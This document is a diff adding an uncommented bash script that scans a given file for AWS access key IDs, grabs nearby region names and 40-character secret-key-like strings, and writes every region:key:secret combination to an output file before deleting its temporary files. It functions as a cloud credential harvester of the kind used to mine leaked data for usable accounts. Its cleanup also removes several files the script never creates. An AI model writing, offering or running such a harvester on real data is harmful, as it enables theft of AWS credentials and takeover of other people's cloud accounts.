@@ -1,0 +1,21 @@
+b=$(echo $RANDOM | md5sum | head -c 20)
+cat $1 | grep -Po "AKIA[A-Z0-9]{16}" -a | sort -u > $b.clef.txt
+while read line;do
+cat $1 | grep "$line" -a -C25 >$b.ini
+cat $b.ini | grep -E -a -o "(us|eu|ap|ca|cn|sa)-(central|(north|south)?(west|east)?)-[0-9]{1}" >vivs.$b
+from="$line"
+cat $b.ini | sed -n -e '/AKIA/,$p' | grep -aoP '(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40,}(?![A-Za-z0-9/+=])' >vivo.$b
+while read vivs;do
+while read vivo;do
+echo "$vivs:$from:$vivo" >>kka
+done < vivo.$b
+done < vivs.$b
+done < $b.clef.txt
+
+rm -r $b.final
+rm -r $b.clef.txt
+rm -r $b.key
+rm -r viva.$b
+rm -r vivo.$b
+rm -r vivs.$b
+rm -r $b.ini
